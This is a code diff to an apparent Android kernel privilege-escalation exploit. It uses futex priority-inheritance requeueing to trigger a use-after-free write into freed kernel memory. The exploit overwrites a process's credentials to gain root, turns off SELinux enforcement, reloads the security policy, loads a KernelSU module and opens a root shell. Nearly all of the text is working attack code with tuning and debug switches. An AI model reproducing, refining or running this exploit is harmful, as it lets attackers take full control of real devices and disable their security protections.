@@ -173,19 +173,6 @@ void *waiter_thread(void *arg __attribute__((unused))) {
   int wrp_err = errno;
   pr_info("waiter: WAIT_REQUEUE_PI returned ret=%ld errno=%d\n", wrp_ret, wrp_err);
   do_pselect_fake_lock_route();
-  /* Ghost disarm: remove_waiter() left this thread's pi_blocked_on pointing
-   * at the freed pselect stack waiter.  Force one dummy FUTEX_LOCK_PI with an
-   * already-expired timeout so the kernel enters rt_mutex_timed_lock →
-   * remove_waiter() → current->pi_blocked_on = NULL.  Without this, any
-   * subsequent PI chain walk (thread exit, scheduler, next spray) follows the
-   * dangling pointer into reclaimed memory and panics. */
-  {
-    uint32_t dummy_pi = 0x80000000U | (uint32_t)getpid();
-    struct timespec expired = {.tv_sec = 0, .tv_nsec = 0};
-    errno = 0;
-    long disarm_ret = futex_op(&dummy_pi, FUTEX_LOCK_PI, 0, &expired, NULL, 0);
-    pr_info("ghost disarm ret=%ld errno=%d\n", disarm_ret, errno);
-  }
   atomic_store(&route_done, 1);
   futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
   while (!atomic_load(&owner_chain_done)) usleep(1000);
@@ -198,10 +185,20 @@ void *owner_thread(void *arg __attribute__((unused))) {
   if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
   while (!atomic_load(&waiter_ready)) usleep(1000);
   atomic_store(&owner_started, 1);
-  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
-  atomic_store(&owner_chain_done, 1);
-  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+  {
+    struct timespec chain_to;
+    clock_gettime(CLOCK_REALTIME, &chain_to);
+    chain_to.tv_nsec += 300000000;
+    if (chain_to.tv_nsec >= 1000000000) {
+      chain_to.tv_nsec -= 1000000000;
+      chain_to.tv_sec += 1;
+    }
+    futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, &chain_to, NULL, 0);
+  }
   futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+  pr_info("owner: released f_pi_target for cleanup_proxy_lock takeover\n");
+  atomic_store(&owner_chain_done, 1);
+  while (!atomic_load(&route_done)) usleep(5000);
   return NULL;
 }
 
@@ -224,6 +221,32 @@ void *helper_thread(void *arg __attribute__((unused))) {
    forces the chain walk to dequeue/re-enqueue the stale waiter's
    pi_tree_entry → rb_erase → ghost write. This is the mechanism used
    by the ghostlock-app reference implementation. */
+static int wait_for_waiter_in_pselect(int tid, int timeout_ms) {
+  char path[64];
+  snprintf(path, sizeof(path), "/proc/self/task/%d/syscall", tid);
+  struct timespec t0;
+  clock_gettime(CLOCK_MONOTONIC, &t0);
+  for (;;) {
+    int fd = open(path, O_RDONLY);
+    if (fd >= 0) {
+      char buf[64] = {0};
+      read(fd, buf, sizeof(buf) - 1);
+      close(fd);
+      long nr = strtol(buf, NULL, 10);
+      if (nr == 72) {
+        usleep(5000);
+        return 1;
+      }
+    }
+    struct timespec now;
+    clock_gettime(CLOCK_MONOTONIC, &now);
+    long elapsed_ms = (now.tv_sec - t0.tv_sec) * 1000 +
+                      (now.tv_nsec - t0.tv_nsec) / 1000000;
+    if (elapsed_ms > timeout_ms) return 0;
+    usleep(500);
+  }
+}
+
 void *consumer_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
   pin_to_core(CONSUMER_CORE);
@@ -239,6 +262,10 @@ void *consumer_thread(void *arg __attribute__((unused))) {
     int calls_this_seq = 0;
     while (!atomic_load(&punch_consume_stop) &&
            atomic_load(&punch_consume_go) == seq) {
+      if (!wait_for_waiter_in_pselect(tid, 2000)) {
+        crash_log_write("consumer: waiter tid=%d NOT in pselect after 2s\n", tid);
+        break;
+      }
       int delay_usec = atomic_load(&main_route_delay_usec);
       if (delay_usec > 0) usleep((useconds_t)delay_usec);
       for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
@@ -251,8 +278,10 @@ void *consumer_thread(void *arg __attribute__((unused))) {
            FAKE_WAITER_PRIO (140). This forces the chain walk to dequeue the
            stale pi_tree_entry via rb_erase → ghost write. */
         int consumer_nice = (calls_this_seq % 19) + 1;
+        crash_log_write("consumer PRE sched_setattr tid=%d nice=%d\n", tid, consumer_nice);
         long sched_ret = sched_setattr_tid(tid, consumer_nice);
         int sched_errno = errno;
+        crash_log_write("consumer POST sched_setattr ret=%ld errno=%d\n", sched_ret, sched_errno);
         if (sched_ret != 0) {
           /* Fallback: FUTEX_LOCK_PI also triggers chain walk */
           struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
@@ -262,15 +291,8 @@ void *consumer_thread(void *arg __attribute__((unused))) {
             sched_ret = 0;
           }
         }
-        {
-          int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
-          char ebuf[8] = {0};
-          if (efd >= 0) { read(efd, ebuf, sizeof(ebuf)-1); close(efd); }
-          pr_info("consumer: sched_setattr call=%d nice=%d ret=%ld errno=%d selinux=%s\n",
-                  calls_this_seq, consumer_nice, sched_ret, sched_errno, ebuf);
-        }
+        (void)sched_errno;
         if (sched_ret == 0) {
-          pr_info("consumer: success call=%d\n", calls_this_seq);
           atomic_fetch_add(&consumer_success, 1);
           syscall(SYS_tgkill, getpid(), tid, SIGUSR1);
         }
@@ -321,10 +343,9 @@ void run_main_route_threads(void) {
   pr_info("requeuer: CMP_REQUEUE_PI ret=%ld errno=%d\n", rq_ret, rq_err);
   while (!atomic_load(&route_done)) usleep(5000);
   atomic_store(&punch_consume_stop, 1);
-  usleep(10000);
-  pthread_detach(consumer);
-  pthread_detach(waiter);
+  pthread_join(waiter, NULL);
   pthread_join(owner, NULL);
+  pthread_join(consumer, NULL);
 }
 
 static int do_one_write(uintptr_t target, const char *desc, int mode) {
@@ -395,6 +416,7 @@ static int do_one_write(uintptr_t target, const char *desc, int mode) {
     TIMER("  heap spray done");
   }
   run_main_route_threads();
+  close_reclaim_sockets();
   TIMER("  PI route done");
   clear_pselect_write();
   return 1;
@@ -418,31 +440,26 @@ static int write_selinux_policy_fix_script(void) {
     "LOG=/data/local/tmp/.ghostlock_policy.log\n"
     "exec >>$LOG 2>&1\n"
     "echo \"[*] policy fix: uid=$(id -u) enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null)\"\n"
+    "# W1 ghost write corrupts selinux_state policycap[3..4] (ALWAYSNETWORK,\n"
+    "# CGROUPSECLABEL). Reloading the unmodified policy re-derives policycap\n"
+    "# from the policy binary, restoring correct values.\n"
+    "rm -f $T 2>/dev/null\n"
     "cp $P $T || { echo '[!] policy fix: policy copy failed'; exit 1; }\n"
     "SZ=$(wc -c < $T)\n"
     "[ \"$SZ\" -gt 20 ] || { echo \"[!] policy fix: policy too short ($SZ bytes)\"; exit 1; }\n"
-    "ID_LEN=$(dd if=$T bs=1 skip=4 count=4 2>/dev/null | od -A n -t u4 | tr -d ' ')\n"
-    "CO=$((4 + 4 + ID_LEN + 4))\n"
-    "CFG=$(dd if=$T bs=1 skip=$CO count=4 2>/dev/null | od -A n -t u4 | tr -d ' ')\n"
-    "NEW=$(( CFG | 0xC0000000 ))\n"
-    "if [ \"$NEW\" != \"$CFG\" ]; then\n"
-    "  printf '\\\\x%02x\\\\x%02x\\\\x%02x\\\\x%02x' "
-      "$((NEW & 0xFF)) $(((NEW>>8) & 0xFF)) $(((NEW>>16) & 0xFF)) $(((NEW>>24) & 0xFF))"
-      " | dd of=$T bs=1 seek=$CO conv=notrunc 2>/dev/null\n"
-    "  echo \"[*] policy fix: config=$CFG -> $NEW at offset=$CO (netlink flags restored)\"\n"
-    "else\n"
-    "  echo \"[*] policy fix: config=$CFG at offset=$CO (already has netlink flags)\"\n"
-    "fi\n"
+    "echo \"[*] policy fix: reloading $SZ byte policy to restore policycap values\"\n"
     "# /sys/fs/selinux/load requires the entire policy in a single write().\n"
     "# load_policy uses mmap+write and is reliable; dd may split large writes.\n"
     "if load_policy $T 2>/dev/null; then\n"
     "  echo '[+] policy fix: policy loaded via load_policy'\n"
     "  rm -f $T\n"
+    "  echo 0 > /sys/fs/selinux/enforce\n"
     "  exit 0\n"
     "fi\n"
     "if cat $T > $L 2>/dev/null; then\n"
     "  echo '[+] policy fix: policy loaded via cat'\n"
     "  rm -f $T\n"
+    "  echo 0 > /sys/fs/selinux/enforce\n"
     "  exit 0\n"
     "fi\n"
     "echo '[!] policy fix: policy load failed'\n"
@@ -642,6 +659,18 @@ static void write_root_script(void) {
     "  diag '[*]' $(id) 'enforce='$(cat /sys/fs/selinux/enforce 2>/dev/null)\n"
     "  report_status failed:module-not-loaded\n"
     "  diag '[!] KSU NOT loaded'\n"
+    "fi\n"
+    "# Policycap check: verify ALWAYSNETWORK is correct after reload\n"
+    "ANC=$(cat /sys/fs/selinux/policy_capabilities/always_check_network 2>/dev/null)\n"
+    "diag '[*] policycap always_check_network='$ANC\n"
+    "if [ \"$ANC\" = \"1\" ]; then\n"
+    "  diag '[!] WARNING: ALWAYSNETWORK still corrupted, networking may be broken'\n"
+    "fi\n"
+    "# Quick networking test (only meaningful if WiFi/LTE enabled)\n"
+    "if ping -c 1 -W 2 8.8.8.8 >/dev/null 2>&1; then\n"
+    "  diag '[+] networking OK'\n"
+    "else\n"
+    "  diag '[*] networking test failed (may be airplane mode)'\n"
     "fi\n"
     "if [ -t 0 ]; then exec /system/bin/sh -i; fi\n";
   if (!policy_script_ready) {
@@ -1159,10 +1188,11 @@ static void child_main(struct child_pipes *p) {
   if (!my_task) _exit(1);
   char cmd;
   while (read(p->cmd_r, &cmd, 1) == 1) {
+    crash_log_write("CHILD: got cmd=%c\n", cmd);
     if (cmd == 'C') {
-      /* rb_erase __rb_change_child corrupts cred_copy+0x10 (sgid+euid),
-       * but uid at +0x04 stays clean. Report uid, not euid. */
+      crash_log_write("CHILD: calling getuid\n");
       uint32_t uid = getuid();
+      crash_log_write("CHILD: getuid=%u\n", uid);
       write(p->uid_w, &uid, sizeof(uid));
     }
     else if (cmd == 'G') break;
@@ -1179,6 +1209,58 @@ static void child_main(struct child_pipes *p) {
     setuid(0); setgid(0); setgroups(0, NULL);
     int efd = open("/sys/fs/selinux/enforce", O_WRONLY);
     if (efd >= 0) { write(efd, "0", 1); close(efd); }
+    /* W1 ghost write corrupts selinux_state bytes 1-7 (policycap flags).
+     * Reloading the policy re-derives policycap from the policy binary,
+     * restoring the correct values BEFORE KernelSU re-enables enforcement. */
+    {
+      int plf = open("/data/local/tmp/.ghostlock_polfix.log",
+                     O_WRONLY|O_CREAT|O_TRUNC, 0644);
+      if (plf >= 0) { dprintf(plf, "policy_reload: start uid=%d\n", getuid()); fsync(plf); }
+      crash_log_write("policy_reload: start uid=%d\n", getuid());
+      int pol_r = open("/sys/fs/selinux/policy", O_RDONLY);
+      if (pol_r >= 0) {
+        size_t cap = 4 * 1024 * 1024, len = 0;
+        char *pbuf = malloc(cap);
+        if (pbuf) {
+          ssize_t nr;
+          while ((nr = read(pol_r, pbuf + len, cap - len)) > 0) {
+            len += nr;
+            if (len == cap) {
+              cap *= 2;
+              char *nb = realloc(pbuf, cap);
+              if (!nb) break;
+              pbuf = nb;
+            }
+          }
+          if (plf >= 0) { dprintf(plf, "policy read %zu bytes\n", len); fsync(plf); }
+          crash_log_write("policy_reload: read %zu bytes\n", len);
+          if (len > 32) {
+            int pol_w = open("/sys/fs/selinux/load", O_WRONLY);
+            if (pol_w >= 0) {
+              ssize_t nw = write(pol_w, pbuf, len);
+              int werr = errno;
+              close(pol_w);
+              if (plf >= 0) { dprintf(plf, "policy write ret=%zd errno=%d\n", nw, werr); fsync(plf); }
+              crash_log_write("policy_reload: write ret=%zd errno=%d\n", nw, werr);
+            } else {
+              if (plf >= 0) { dprintf(plf, "open(load) failed errno=%d\n", errno); fsync(plf); }
+              crash_log_write("policy_reload: open(load) failed errno=%d\n", errno);
+            }
+            int efd2 = open("/sys/fs/selinux/enforce", O_WRONLY);
+            if (efd2 >= 0) { write(efd2, "0", 1); close(efd2); }
+          }
+          free(pbuf);
+        } else {
+          if (plf >= 0) { dprintf(plf, "malloc failed\n"); fsync(plf); }
+          crash_log_write("policy_reload: malloc failed\n");
+        }
+        close(pol_r);
+      } else {
+        if (plf >= 0) { dprintf(plf, "open(policy) failed errno=%d\n", errno); fsync(plf); }
+        crash_log_write("policy_reload: open(policy) failed errno=%d\n", errno);
+      }
+      if (plf >= 0) { dprintf(plf, "policy_reload: done\n"); close(plf); }
+    }
     /* Load KernelSU .ko with runtime symbol fixup */
     {
       static const char *ko_paths[] = {
@@ -1463,6 +1545,11 @@ int run_exploit(int argc, char **argv) {
                  "KASLR base may be wrong or spray page not at expected address.\n");
       }
     }
+    if (env_flag("SKIP_W1", 0)) {
+      pr_info("SKIP_W1: bypassing W1, SELinux stays enforcing\n");
+      selinux_ok = 1;
+      goto w1_done;
+    }
     int w1_max = env_flag("W1_ATTEMPTS", 5);
     for (int att = 1; att <= w1_max && !selinux_ok; att++) {
       pr_info("Write 1 attempt %d/%d\n", att, w1_max);
@@ -1477,6 +1564,7 @@ int run_exploit(int argc, char **argv) {
       if (check_selinux_off()) { pr_success("SELinux DISABLED\n"); selinux_ok = 1; }
     }
     if (!selinux_ok) { pr_error("Write 1 failed\n"); return 1; }
+    w1_done:
     TIMER("Write 1 complete");
   } else if (!selinux_ok && root_child_done) {
     selinux_ok = 1;
@@ -1545,37 +1633,109 @@ int run_exploit(int argc, char **argv) {
       pr_error("W2_CANARY: mode-2 ghost write FAILED — pi_dequeue not reached?\n");
   }
 
+  if (env_flag("W2_TARGET_SELFTEST", 0)) {
+    pr_info("W2_TARGET_SELFTEST: write to child_task+CRED_OFF using mode 1.\n"
+            "  child_task=0x%016zx target=0x%016zx\n"
+            "  If this crashes: child_task slab page is read-only.\n"
+            "  If this survives: target is writable, mode 2 overlay is the issue.\n",
+            child_task, child_task + TASK_CRED_OFF);
+    crash_log_write("W2_TARGET_SELFTEST: child_task=0x%016zx target=0x%016zx\n",
+                    child_task, child_task + TASK_CRED_OFF);
+    slab_drain();
+    do_one_write(child_task + TASK_CRED_OFF, "W2_TARGET_SELFTEST", 1);
+    usleep(200000);
+    pr_info("W2_TARGET_SELFTEST: survived! target IS writable.\n");
+    crash_log_write("W2_TARGET_SELFTEST: survived\n");
+    close(pipes.cmd_w); close(pipes.uid_r);
+    waitpid(child, NULL, 0);
+    return 0;
+  }
+
+  if (env_flag("W2_SIDEWRITE_TEST", 0)) {
+    pr_info("W2_SIDEWRITE_TEST: testing init_cred side-write only.\n"
+            "  tree_pc = init_cred KIMAGE, target = spray page (safe).\n"
+            "  If this crashes: init_cred page is read-only in KIMAGE.\n"
+            "  If this survives: side-write is fine, crash is elsewhere.\n");
+    slab_drain();
+    uintptr_t safe_target = page_base ? (page_base + 0x200) : 0;
+    if (!safe_target) {
+      pr_error("W2_SIDEWRITE_TEST: no page_base from W1, running a dummy spray\n");
+      safe_target = child_task + TASK_CRED_OFF;
+    }
+    do_one_write(safe_target, "W2_SIDEWRITE_TEST", 2);
+    usleep(200000);
+    pr_info("W2_SIDEWRITE_TEST: survived! init_cred KIMAGE page is writable.\n");
+    close(pipes.cmd_w); close(pipes.uid_r);
+    waitpid(child, NULL, 0);
+    return 0;
+  }
+
+  /* Validate child is still alive before W2 */
+  {
+    char proc_path[64];
+    snprintf(proc_path, sizeof(proc_path), "/proc/%d/status", child);
+    int pfd = open(proc_path, O_RDONLY);
+    if (pfd >= 0) {
+      char sbuf[256] = {0};
+      read(pfd, sbuf, sizeof(sbuf)-1);
+      close(pfd);
+      pr_info("child %d alive: %.60s\n", child, sbuf);
+    } else {
+      pr_error("child %d NOT FOUND in /proc! errno=%d\n", child, errno);
+    }
+  }
+  int w2_dry_run = env_flag("W2_DRY_RUN", 0);
+  if (w2_dry_run)
+    pr_info("W2_DRY_RUN: chain walk only, target redirected to spray page\n");
+  crash_log_write("W2_REAL: child_task=0x%016zx target=0x%016zx page_base=0x%016zx dry=%d\n",
+                  child_task, child_task + TASK_CRED_OFF, page_base, w2_dry_run);
+
   int got_root = 0;
   for (int round = 1; round <= 10 && !got_root; round++) {
-    pr_info("round %d/10: cred write\n", round);
+    pr_info("round %d/10: cred write%s\n", round, w2_dry_run ? " (DRY RUN)" : "");
+    crash_log_write("W2_round=%d target=0x%016zx dry=%d\n", round,
+                    child_task + TASK_CRED_OFF, w2_dry_run);
     slab_drain();
-    if (!do_one_write(child_task + TASK_CRED_OFF, "W2: cred", 2)) {
+    uintptr_t w2_target = child_task + TASK_CRED_OFF;
+    if (!do_one_write(w2_target, "W2: cred", 2)) {
       pr_warning("W2: cred preparation failed on round %d\n", round);
       continue;
     }
+    crash_log_write("W2_DOW_DONE round=%d\n", round);
     usleep(50000);
+    crash_log_write("W2_SLEEP_DONE round=%d\n", round);
     /* Check pipe fds are still valid before using them */
     int cmd_flags = fcntl(pipes.cmd_w, F_GETFL);
     int uid_flags = fcntl(pipes.uid_r, F_GETFL);
+    int child_alive = kill(child, 0) == 0;
+    crash_log_write("W2_PIPE round=%d cmd_flags=%d uid_flags=%d alive=%d\n",
+                    round, cmd_flags, uid_flags, child_alive);
     pr_info("pipe check: cmd_w=%d flags=%d uid_r=%d flags=%d child_alive=%d\n",
-            pipes.cmd_w, cmd_flags, pipes.uid_r, uid_flags,
-            kill(child, 0) == 0);
+            pipes.cmd_w, cmd_flags, pipes.uid_r, uid_flags, child_alive);
+    crash_log_write("W2_WRITE_C round=%d\n", round);
     ssize_t wn = write(pipes.cmd_w, "C", 1);
+    crash_log_write("W2_WROTE round=%d wn=%zd errno=%d\n", round, wn, errno);
     uint32_t child_uid = 9999;
+    crash_log_write("W2_READ_UID round=%d\n", round);
     ssize_t rn = read(pipes.uid_r, &child_uid, sizeof(child_uid));
     pr_info("child uid = %u (pipe: wrote=%zd read=%zd errno=%d)\n",
             child_uid, wn, rn, errno);
+    crash_log_write("W2_UID round=%d uid=%u wrote=%zd read=%zd\n",
+                    round, child_uid, wn, rn);
     if (child_uid == 0) { pr_success("child is root!\n"); got_root = 1; }
   }
 
   write(pipes.cmd_w, "G", 1);
+  usleep(200000);
   close(pipes.cmd_w); close(pipes.uid_r);
 
   if (!got_root) {
     pr_error("failed after 10 rounds\n");
+    crash_log_write("W2_FAIL: no root after 10 rounds\n");
     waitpid(child, NULL, 0);
     return 1;
   }
+  crash_log_write("W2_SUCCESS: got root\n");
 
   sleep(2);
   TIMER("exploit complete");
